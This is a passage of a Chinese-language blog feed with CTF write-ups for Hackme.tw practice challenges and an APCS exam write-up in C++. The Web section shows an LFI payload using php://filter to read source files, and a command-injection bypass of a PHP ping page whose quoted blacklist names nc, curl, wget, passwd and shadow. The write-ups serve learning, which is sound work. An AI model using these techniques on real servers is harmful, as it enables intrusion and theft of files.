    <summary type="html">&lt;p&gt;因為喜歡上Pwn所以想要加強實力，然後就在網路上找找古題來解，希望可以學到點東西!&lt;/p&gt;
&lt;p&gt;在網路上找到了這題AIS3-2017的題目，Pwn-end。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://twinklestar03.com/categories/CTF/"/>
    
    
    <category term="AIS3-2017" scheme="https://twinklestar03.com/tags/AIS3-2017/"/>
    
    <category term="Pwn" scheme="https://twinklestar03.com/tags/Pwn/"/>
    
    <category term="Writeup" scheme="https://twinklestar03.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Hackme.tw::解題過程(進度:Web-0x05)</title>
    <link href="https://twinklestar03.com/Contest/CTF/Hackme-tw_Writeup/"/>
    <id>https://twinklestar03.com/Contest/CTF/Hackme-tw_Writeup/</id>
    <published>2019-06-23T16:00:00.000Z</published>
    <updated>2020-12-18T07:36:09.884Z</updated>
    
    <content type="html"><![CDATA[<p>為了練習CTF相關知識，所以到了這個網站上來玩，會慢慢的更新解題思路讓自己有點回饋~</p><a id="more"></a><p><a href="https://hackme.inndy.tw/">網站在這邊&gt;~&lt;</a></p><p>未來一直更新下去的話文章會很長很長，如果想要針對某一題或是類別的話電腦板網站左側有文章目錄可以按!</p><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><hr><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><blockquote><p>All flags are in this format: FLAG{XXXXXXXXX}</p></blockquote><p>如題目敘述所示XDD</p><hr><h2 id="corgi-can-fly"><a href="#corgi-can-fly" class="headerlink" title="corgi can fly"></a>corgi can fly</h2><blockquote><p>Corgi is cute, right?</p></blockquote><p>不知道該做甚麼的時候...<code>hexdump -C</code>!!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">000cb150  61 6e 20 46 6c 79 dc 8d  04 1e 00 00 00 23 74 45  |an Fly.......#tE|</span><br><span class="line">000cb160  58 74 41 72 74 69 73 74  00 52 47 6c 6b 49 48 6c  |XtArtist.RGlkIHl|</span><br><span class="line">000cb170  76 64 53 42 30 63 6d 6c  6c 5a 43 42 4d 55 30 49  |vdSB0cmllZCBMU0I|</span><br><span class="line">000cb180  2f 43 67 3d 3d d1 5a 87  ea 00 00 00 00 49 45 4e  |&#x2F;Cg&#x3D;&#x3D;.Z......IEN|</span><br><span class="line">000cb190  44 ae 42 60 82                                    |D.B&#96;.|</span><br></pre></td></tr></table></figure><p>在結尾有看到base64編碼過的編碼，特徵應該就是那兩個<code>==</code>，拿去base64 decode一下吧~<br><code>RGlkIHlvdSB0cmllZCBMU0ICg==</code> =&gt; <code>Did you tried LSB</code><br>不知道甚麼是LSB，先Google一下吧，查到了LSB是一種可以在圖片中隱寫的技巧，這時候就來找工具吧!</p><p>這邊使用了<strong>stegsolve</strong>，一種圖片解碼器吧(?。 總之點開來load圖片進去然後gui點一點就會得到一個QRcode，掃一下答案就出來了!!</p><hr><h2 id="television"><a href="#television" class="headerlink" title="television"></a>television</h2><blockquote><p>Looks like my television was broken</p></blockquote><p>這一題一開始會拿到一個<code>.bmp</code>的檔案，所以我就敲了<code>bmp file encryption</code>進去了google，得到了一個可能的答案: CBC Encrypted，因為被這種加密過後的bmp圖片跟題目給出來的長的差不多，結果好像不是….</p><p>所以我用了<code>strings</code>觀察一下檔案….</p><p>Flag直接就在裡面了XDD</p><hr><h2 id="meow"><a href="#meow" class="headerlink" title="meow"></a>meow</h2><blockquote><p>Pusheen is cute!</p></blockquote><p>這次拿到了一個<code>.png</code>檔案，<code>binwalk</code>走起看看裡面藏了甚麼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">binwalk meow.png</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 296 x 279, 8-bit&#x2F;color RGBA, non-interlaced</span><br><span class="line">41            0x29            Zlib compressed data, compressed</span><br><span class="line">48543         0xBD9F          Zip archive data, at least v1.0 to extract, name: meow&#x2F;</span><br><span class="line">48606         0xBDDE          Zip archive data, encrypted at least v2.0 to extract, compressed size: 51, uncompressed size: 47, name: meow&#x2F;flag</span><br><span class="line">48740         0xBE64          Zip archive data, at least v1.0 to extract, name: meow&#x2F;t39.1997-6&#x2F;</span><br><span class="line">48814         0xBEAE          Zip archive data, at least v1.0 to extract, name: meow&#x2F;t39.1997-6&#x2F;p296x100&#x2F;</span><br><span class="line">48897         0xBF01          Zip archive data, encrypted at least v2.0 to extract, compressed size: 48404, uncompressed size: 48543, name: meow&#x2F;t39.1997-6&#x2F;p296x100&#x2F;10173502_279586372215628_1950740854_n.png</span><br><span class="line">97912         0x17E78         End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure><p>恩…看起來有.zip藏在裡面呢w 怎麼把它挖出來呢，使用<code>foremost</code>一個檔案還原工具!<br>之後會產出一個output資料夾，裡面有剛剛的<code>00000094.zip</code>還額外拿到一個<code>00000000.png</code>，</p><p>總之先<code>unzip 00000094.zip</code>....</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Archive:  00000094.zip</span><br><span class="line">[00000094.zip] meow&#x2F;flag password:</span><br></pre></td></tr></table></figure><p>看起來跟我要密碼，<del>我去哪裡生出來XDD</del><br>先分析看看這個拆出來的<code>.zip</code>吧，<code>unzip -v</code>走起!!(<strong>unzip -v: list verbosely/show version info</strong>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">unzip -v 00000094.zip</span><br><span class="line">Archive:  00000094.zip</span><br><span class="line"> Length   Method    Size  Cmpr    Date    Time   CRC-32   Name</span><br><span class="line">--------  ------  ------- ---- ---------- ----- --------  ----</span><br><span class="line">       0  Stored        0   0% 2016-06-11 17:22 00000000  meow&#x2F;</span><br><span class="line">      47  Defl:N       39  17% 2016-06-11 17:22 3046cea4  meow&#x2F;flag</span><br><span class="line">       0  Stored        0   0% 2016-06-11 17:20 00000000  meow&#x2F;t39.1997-6&#x2F;</span><br><span class="line">       0  Stored        0   0% 2016-06-11 17:21 00000000  meow&#x2F;t39.1997-6&#x2F;p296x100&#x2F;</span><br><span class="line">   48543  Defl:N    48392   0% 2014-05-14 06:59 cdad52bd  meow&#x2F;t39.1997-6&#x2F;p296x100&#x2F;10173502_279586372215628_1950740854_n.png</span><br><span class="line">--------          -------  ---                            -------</span><br><span class="line">   48590            48431   0%                            5 files</span><br></pre></td></tr></table></figure><p>這裡頭也有一個.png耶，他的CRC32: cdad52bd，把剛剛招喚出來的<code>00000000.png</code>比較CRC32看看….<strong>一致耶!</strong></p><p>這樣的話這個 <strong>zip存在著明文攻擊(known plain text attack)</strong> 的! <strong><code>pkcrack</code>走起!!</strong><br>如果要執行這個攻擊方式的話要<strong>把已知的部分製作成zip file</strong>，再使用pkcrack工具(之後來研究原理再做個文章介紹)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zip plain.zip 00000000.png&#96;</span><br><span class="line">pkcrack -C 00000094.zip  -c meow&#x2F;t39.1997-6&#x2F;p296x100&#x2F;10173502_279586372215628_1950740854_n.png -P plain.zip  -p ..&#x2F;png&#x2F;00000000.png -d resu</span><br><span class="line">lt.zip -a</span><br><span class="line">unzip result.zip</span><br><span class="line">cat meow&#x2F;flag</span><br></pre></td></tr></table></figure><p>這個花好多心力再搞懂zip跟一些工具，花了不少時間但是收穫多多!d(`･∀･)b</p><hr><h2 id="where-is-flag"><a href="#where-is-flag" class="headerlink" title="where is flag"></a>where is flag</h2><blockquote><p>Do you know regular expression? </p></blockquote><p>TBD</p><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><hr><h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><blockquote><p>Can you see me? I’m so close to you but you can’t see me.</p></blockquote><p>對著Hackme.tw的首頁<code>Ctrl + U</code> &amp; <code>Ctrl + F</code>輸入FLAG，蹦!</p><hr><h2 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a>guestbook</h2><blockquote><p>This guestbook sucks. sqlmap is your friend.</p></blockquote><p>TBD</p><hr><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><blockquote><p>What this admin’s password? That is not important at all, just get the flag.<br>Tips: LFI, php://filter</p></blockquote><p>這題我發現有兩條路可以走，都可以拿到Flag，<strong>兩條路的攻擊方法都是Local File Inclusion Attack</strong>只是一個是打<code>/login</code>一個是猜的，開始囉(ゝ∀･)</p><p>我們一開始可以看到網址<code>https://hackme.inndy.tw/lfi/?page=pages/index</code>使用了<code>?page</code>來取得資源，但是如果直接改掉網址轉向到其他地方會出現一個訊息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H@cK3r F0UnD</span><br></pre></td></tr></table></figure><p>這很明顯不是我們要的，在題目的提示還給出了<code>php://filter</code>這個提示，應該是希望我們使用這個東西來bypass掉網址保護，把內容用base64 encode之後輸出<code>php://filter/read=convert.base64-encode/resource=</code></p><p>把網址改成<code>https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag</code>來存取網頁原始碼(flag.php是猜的)</p><p>得到一串Base64，找個工具decode得出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can you read the flag&lt;?php require(&#39;config.php&#39;); ?&gt;?</span><br></pre></td></tr></table></figure><p>還真的有東西，那就讀他的<code>config.php</code>吧! Flag就在裡面</p><hr><h2 id="homepage"><a href="#homepage" class="headerlink" title="homepage"></a>homepage</h2><blockquote><p>Where is the flag? Did you check the code?</p></blockquote><p>在首頁使用<code>F12</code>然後進到console tab，有個QRCodeXD</p><hr><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><blockquote><p>Can you ping 127.0.0.1?</p></blockquote><p>一點進去就會出現一個網頁有textbox跟button，而且一開始就把php source code吐出來了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Ping&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;.&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">        IP: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;ip&quot;</span>&gt; &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Ping&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;pre&gt;<span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$blacklist</span> = [</span><br><span class="line">            <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;nc&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;cp&#x27;</span>, <span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;mv&#x27;</span>, <span class="string">&#x27;rm&#x27;</span>, <span class="string">&#x27;ps&#x27;</span>, <span class="string">&#x27;top&#x27;</span>, <span class="string">&#x27;sleep&#x27;</span>, <span class="string">&#x27;sed&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;apt&#x27;</span>, <span class="string">&#x27;yum&#x27;</span>, <span class="string">&#x27;curl&#x27;</span>, <span class="string">&#x27;wget&#x27;</span>, <span class="string">&#x27;perl&#x27;</span>, <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;ruby&#x27;</span>, <span class="string">&#x27;kill&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>, <span class="string">&#x27;shadow&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;dd&#x27;</span>, <span class="string">&#x27;df&#x27;</span>, <span class="string">&#x27;du&#x27;</span>, <span class="string">&#x27;free&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;tee&#x27;</span>, <span class="string">&#x27;sha&#x27;</span>, <span class="string">&#x27;x64&#x27;</span>, <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;xargs&#x27;</span>, <span class="string">&#x27;PATH&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;$0&#x27;</span>, <span class="string">&#x27;proc&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&quot;\n&quot;</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        set_time_limit(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"><span class="variable">$ip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$blacklist</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="variable">$ip</span>) &gt; <span class="number">15</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;IP toooooo longgggggggggg&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$keyword</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(strstr(<span class="variable">$ip</span>, <span class="variable">$keyword</span>)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;<span class="subst">&#123;$keyword&#125;</span> not allowed&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$ret</span> = [];</span><br><span class="line">                exec(<span class="string">&quot;ping -c 1 \&quot;<span class="subst">&#123;$ip&#125;</span>\&quot; 2&gt;&amp;1&quot;</span>, <span class="variable">$ret</span>);</span><br><span class="line">                <span class="keyword">return</span> implode(<span class="string">&quot;\n&quot;</span>, array_slice(<span class="variable">$ret</span>, <span class="number">0</span>, <span class="number">10</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))</span><br><span class="line">            <span class="keyword">echo</span> htmlentities(ping(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="meta">?&gt;</span>&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>我們可以觀察到前面有個blacklist，看起來是用來避免textbox出現這些東西，繼續往下就會看到有個<code>exec()</code>的function，我們應該可以透過command injection來拿flag</p><p>但是不能直接寫指令上去，要先把之前的ping隔開，但是大多數的符號都被禁止了，好佳在**”`(反斜線)”**沒有被禁止，而且<code>ls</code>也沒有被禁止，我們先試試看<code>反斜線ls反斜線</code>吧!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping: flag.php</span><br><span class="line">index.php: Name or service not known</span><br></pre></td></tr></table></figure><p>看起來有個<code>flag.php</code>的檔案，但是我們不能使用<code>cat</code>也不能寫腳本讓他跑，但其實還有<code>sort</code>可以用，試試看<code>sort flag.php</code>!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not allowed</span><br></pre></td></tr></table></figure><p>對耶，flag也在blacklist裡面，我們還有一種工具，叫做wildcard<code>?</code>，那把輸入改成<code>sort ????????</code>就會吐flag出來了!</p><p>看起來blacklist沒有禁止<code>grep</code>之後再來試試看能不能用grep吐flag。</p><hr><h2 id="scoreboard"><a href="#scoreboard" class="headerlink" title="scoreboard"></a>scoreboard</h2><blockquote><p>DO NOT ATTACK or SCAN scoreboard, you don’t need to do that.</p></blockquote><p>Flag在response header裡面。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;為了練習CTF相關知識，所以到了這個網站上來玩，會慢慢的更新解題思路讓自己有點回饋~&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://twinklestar03.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://twinklestar03.com/tags/CTF/"/>
    
    <category term="Hackme.tw" scheme="https://twinklestar03.com/tags/Hackme-tw/"/>
    
  </entry>
  
  <entry>
    <title>APCS-201906::解題過程</title>
    <link href="https://twinklestar03.com/Contest/APCS/APCS-20190615/"/>
    <id>https://twinklestar03.com/Contest/APCS/APCS-20190615/</id>
    <published>2019-06-14T16:00:00.000Z</published>
    <updated>2020-12-18T07:36:15.271Z</updated>
    
    <content type="html"><![CDATA[<p>APCS初挑戰(･ω´･ )<br>裸考上陣測試自己的實力所在<del>其實是太高估自己</del><br>沒意外的話應該是概念題4級分、實作題3級分~</p><p>以下是題目的Writeup(`・ω・´)，雖然在現場沒有全部寫出來不過還是要有複習的好習慣!<br>可能寫得很糟，如果有更好的建議可以透過社交軟體聯絡我說說你的想法!</p><a id="more"></a><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><hr><h2 id="球隊計分"><a href="#球隊計分" class="headerlink" title="球隊計分"></a>球隊計分</h2><p><a href="/images/APCS/20190615/P1.pdf">點我閱讀題目</a></p><p>一個蠻簡單的題目，題目有4行輸入、每行有4個數字代表該局得分，1、3行是主隊得分，2、4行是客隊得分，求上下半場的總分跟誰獲勝(Win、Lose、Tie)。</p><figure class="highlight cpp"><figcaption><span>P1.cpp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x[<span class="number">4</span>], y[<span class="number">4</span>], w1 = <span class="number">0</span>, w2 = <span class="number">0</span>, sum[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 上半場</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;x[<span class="number">0</span>], &amp;x[<span class="number">1</span>], &amp;x[<span class="number">2</span>], &amp;x[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;y[<span class="number">0</span>], &amp;y[<span class="number">1</span>], &amp;y[<span class="number">2</span>], &amp;y[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    sum[<span class="number">0</span>] = x[<span class="number">0</span>] + x[<span class="number">1</span>] + x[<span class="number">2</span>] + x[<span class="number">3</span>];</span><br><span class="line">    sum[<span class="number">1</span>] = y[<span class="number">0</span>] + y[<span class="number">1</span>] + y[<span class="number">2</span>] + y[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span> (sum[<span class="number">0</span>] &gt; sum[<span class="number">1</span>]) w1 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (sum[<span class="number">0</span>] == sum[<span class="number">1</span>]) w1 = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d:%d\n&quot;</span>, sum[<span class="number">0</span>], sum[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下半場</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;x[<span class="number">0</span>], &amp;x[<span class="number">1</span>], &amp;x[<span class="number">2</span>], &amp;x[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;y[<span class="number">0</span>], &amp;y[<span class="number">1</span>], &amp;y[<span class="number">2</span>], &amp;y[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    sum[<span class="number">0</span>] = x[<span class="number">0</span>] + x[<span class="number">1</span>] + x[<span class="number">2</span>] + x[<span class="number">3</span>];</span><br><span class="line">    sum[<span class="number">1</span>] = y[<span class="number">0</span>] + y[<span class="number">1</span>] + y[<span class="number">2</span>] + y[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span> (sum[<span class="number">0</span>] &gt; sum[<span class="number">1</span>]) w2 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (sum[<span class="number">0</span>] == sum[<span class="number">1</span>]) w2 = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d:%d\n&quot;</span>, sum[<span class="number">0</span>], sum[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 狀態</span></span><br><span class="line">    <span class="keyword">if</span> (w1 == <span class="number">1</span> &amp;&amp; w2 == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Win&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (w2 == <span class="number">0</span> &amp;&amp; w2 == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Lose&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Tie&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="路徑和"><a href="#路徑和" class="headerlink" title="路徑和"></a>路徑和</h2><p><a href="/images/APCS/20190615/P2.pdf">點我閱讀題目</a> </p><p>給出一個N*M的帶權重方陣，要把走過的路的權重都加起來，但是有些限制</p><ul><li>只能<strong>從權重最小的格子開始</strong></li><li>如果有周遭有多個格子可以走，<strong>只能走權重最小的</strong></li><li><strong>不可以走走過的格子</strong></li></ul><p>假設有個4*6的方陣:<img src="/images/APCS/20190615/1906_P2_1.png"><br>那他的走法會長這樣: <img src="/images/APCS/20190615/1906_P2_2.png"></p><p><strong>策略</strong> 先檢查先上下左右的格子可不可以走、有沒有超界，再來看哪個格子最小就往哪裡走!</p><figure class="highlight cpp"><figcaption><span>P2.cpp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 100001</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> R, C;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;R, &amp;C);</span><br><span class="line">    <span class="keyword">int</span> weight[R][C], visit[R][C]; <span class="comment">// 權重 跟 有沒有走訪過(走過會設定成非0)</span></span><br><span class="line">    <span class="keyword">int</span> min_pos[<span class="number">2</span>], min; <span class="comment">// min_pos = [R, C]</span></span><br><span class="line"></span><br><span class="line">    min = INF; <span class="comment">// (題目給的範圍)+1, 這樣就一定可以找到最小值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; R; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; C; j++)&#123;</span><br><span class="line">            <span class="keyword">int</span> w;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;w);</span><br><span class="line">            <span class="keyword">if</span> (w &lt; min) &#123; <span class="comment">// 記錄權重最小的格子 出發要用到</span></span><br><span class="line">                min = w;</span><br><span class="line">                min_pos[<span class="number">0</span>] = i;</span><br><span class="line">                min_pos[<span class="number">1</span>] = j;</span><br><span class="line">            &#125;</span><br><span 